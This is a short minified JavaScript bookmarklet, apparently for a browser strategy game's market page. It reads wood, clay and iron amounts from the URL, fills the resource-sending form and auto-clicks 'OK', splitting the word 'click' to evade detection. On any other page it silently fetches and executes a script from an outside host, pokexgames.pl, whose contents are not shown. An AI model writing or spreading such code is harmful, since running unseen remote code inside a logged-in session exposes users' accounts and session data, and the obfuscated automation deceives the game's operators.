var doc = window.document;if (!doc.URL.match('game\.php')) {for (var i = 0; i < window.frames.length; 
i++) {if (window.frames[i].document.URL.match('game\.php')) {doc = window.frames[i].document}}}if 
(doc.URL.match(/screen=market/) || doc.URL.match(/confirm_send/)) {var e = doc.forms[0];function 
getValue(input) {var value = parseInt(input, 10);if (isNaN(value)) value = 0;return value}var wood = 
getValue(e.wood.value);var clay = getValue(e.stone.value);var iron = getValue(e.iron.value);if (wood 
+ clay + iron > 0) {var q = e.getElementsByTagName('input');for (var w = 0; w < q.length; w++) {if 
(q[w].value.indexOf('OK') != -1) {q[w]['cli'+'ck']();break}}} else {var URLargs = 
doc.URL.split("&");for (var i = 0; i < URLargs.length; i++) {var args = URLargs[i].split("=");if 
(args.length == 2) {if (args[0] == 'wood') wood = parseInt(args[1]);else if (args[0] == 'clay') clay 
= parseInt(args[1]);else if (args[0] == 'iron') iron = parseInt(args[1])}}if (wood + clay + iron < 1) 
window.close();insertNumber(e.wood, wood);insertNumber(e.stone, clay);insertNumber(e.iron, iron)}} 
else {$.ajax({url:'https://pokexgames.pl/zygzagz/mb.php',cache:true,dataType: "script"});}
